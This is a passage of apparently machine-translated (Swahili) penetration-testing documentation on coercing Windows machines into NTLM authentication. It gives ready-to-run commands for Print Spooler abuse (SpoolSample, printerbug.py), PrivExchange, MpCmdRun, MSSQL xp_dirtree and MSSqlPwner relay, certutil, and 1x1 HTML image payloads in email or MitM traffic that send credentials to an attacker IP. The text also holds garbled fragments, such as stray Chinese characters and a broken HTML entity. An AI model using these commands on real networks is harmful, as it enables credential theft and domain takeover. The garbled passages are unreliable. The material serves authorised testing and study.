# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) ni **mkusanyiko** wa **triggers za uthibitishaji wa mbali** zilizopangwa kwa C# kwa kutumia MIDL compiler ili kuepuka utegemezi wa wahusika wa tatu.

## Spooler Service Abuse

Ikiwa huduma ya _**Print Spooler**_ ime **wezeshwa,** unaweza kutumia baadhi ya akidi za AD zinazojulikana tayari ku **omba** server ya uchapishaji ya Domain Controller **kuh更新** kuhusu kazi mpya za uchapishaji na kumwambia tu **aitumie arifa kwa mfumo fulani**.\
Kumbuka wakati printer inatuma arifa kwa mifumo isiyo ya kawaida, inahitaji **kujiimarisha dhidi** ya **mfumo** huo. Hivyo, mshambuliaji anaweza kufanya huduma ya _**Print Spooler**_ kujiimarisha dhidi ya mfumo wowote, na huduma hiyo itatumia **akaunti ya kompyuta** katika uthibitishaji huu.

### Finding Windows Servers on the domain

Kwa kutumia PowerShell, pata orodha ya masanduku ya Windows. Servers kwa kawaida ni kipaumbele, hivyo hebu tuzingatie hapo:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Kupata huduma za Spooler zinazot listening

Kwa kutumia toleo lililobadilishwa kidogo la @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), angalia kama Huduma ya Spooler inasikiliza:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Unaweza pia kutumia rpcdump.py kwenye Linux na kutafuta Protokali ya MS-RPRN
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Omba huduma kuthibitisha dhidi ya mwenyeji yeyote

Unaweza kukusanya[ **SpoolSample kutoka hapa**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
au tumia [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) au [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) ikiwa uko kwenye Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Kuunganisha na Uwakilishi Usio na Kikomo

Ikiwa mshambuliaji tayari ameathiri kompyuta yenye [Uwakilishi Usio na Kikomo](unconstrained-delegation.md), mshambuliaji anaweza **kufanya printer ithibitishwe dhidi ya kompyuta hii**. Kwa sababu ya uwakilishi usio na kikomo, **TGT** ya **akaunti ya kompyuta ya printer** itakuwa **imehifadhiwa katika** **kumbukumbu** ya kompyuta yenye uwakilishi usio na kikomo. Kwa kuwa mshambuliaji tayari ameathiri mwenyeji huyu, ataweza **kurejesha tiketi hii** na kuifanya itumike ([Pass the Ticket](pass-the-ticket.md)).

## RCP Kulazimisha uthibitisho

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

Shambulio la `PrivExchange` ni matokeo ya kasoro iliyopatikana katika **kipengele cha `PushSubscription` cha Exchange Server**. Kipengele hiki kinaruhusu server ya Exchange kulazimishwa na mtumiaji yeyote wa kikoa mwenye sanduku la barua kuthibitisha kwa mwenyeji wowote uliopewa na mteja kupitia HTTP.

Kwa kawaida, **huduma ya Exchange inafanya kazi kama SYSTEM** na inapewa mamlaka kupita kiasi (hasa, ina **WriteDacl privileges kwenye kikoa kabla ya Sasisho la Jumla la 2019**). Kasoro hii inaweza kutumika kuweza **kupeleka taarifa kwa LDAP na kisha kutoa hifadhidata ya NTDS ya kikoa**. Katika hali ambapo kupeleka kwa LDAP haiwezekani, kasoro hii bado inaweza kutumika kupeleka na kuthibitisha kwa wenyeji wengine ndani ya kikoa. Ufanisi wa shambulio hili unatoa ufikiaji wa haraka kwa Msimamizi wa Kikoa na akaunti yoyote ya mtumiaji wa kikoa iliyoidhinishwa.

## Ndani ya Windows

Ikiwa tayari uko ndani ya mashine ya Windows unaweza kulazimisha Windows kuungana na server kwa kutumia akaunti zenye mamlaka na:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Au tumia mbinu hii nyingine: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Inawezekana kutumia certutil.exe lolbin (binary iliyosainiwa na Microsoft) kulazimisha uthibitishaji wa NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

Ikiwa unajua **anwani ya barua pepe** ya mtumiaji anayeingia ndani ya mashine unayotaka kuathiri, unaweza tu kumtumia **barua pepe yenye picha ya 1x1** kama
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
na wakati anafungua, atajaribu kuthibitisha.

### MitM

Ikiwa unaweza kufanya shambulio la MitM kwa kompyuta na kuingiza HTML kwenye ukurasa atakaouona unaweza kujaribu kuingiza picha kama ifuatavyo kwenye ukurasa:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Cracking NTLMv1

Ikiwa unaweza kukamata [NTLMv1 challenges soma hapa jinsi ya kuzivunja](../ntlm/#ntlmv1-attack).\
&#xNAN;_&#x52;kumbuka kwamba ili kuvunja NTLMv1 unahitaji kuweka changamoto ya Responder kuwa "1122334455667788"_

{{#include ../../banners/hacktricks-training.md}}
